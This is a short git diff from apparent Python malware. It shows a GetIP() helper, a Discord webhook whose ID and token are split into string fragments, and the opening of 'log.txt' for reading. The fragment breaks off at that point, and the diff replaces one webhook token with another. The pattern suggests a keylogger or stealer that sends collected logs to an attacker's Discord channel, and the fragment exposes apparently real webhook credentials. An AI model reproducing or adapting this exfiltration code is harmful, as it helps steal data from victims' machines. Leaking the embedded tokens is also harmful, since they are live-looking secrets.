@@ -12,8 +12,8 @@ def GetIP():
 
 part1 = '9316956621'
 part2 = '21254972'
-key1 = 'pCis-pIRSVgrdnOvOK2p56AcmsvKIeS7TsCL84cJ'
-key2 = 'tnBbgPaDMPpIidnG94XiWOBoC7WT'
+key1 = 'Kj7KC8bCf-nTjEWXFIM_mJ80JsE-I2Ehw_FDPQ0hq2fAI'
+key2 = 'ivYbJN2FZjo17KcEWHKAYS0'
 webhook = discord.Webhook.partial(part1 + part2, key1 + key2, adapter=discord.RequestsWebhookAdapter())
 
 with open(file='log.txt', mode='rb') as f:
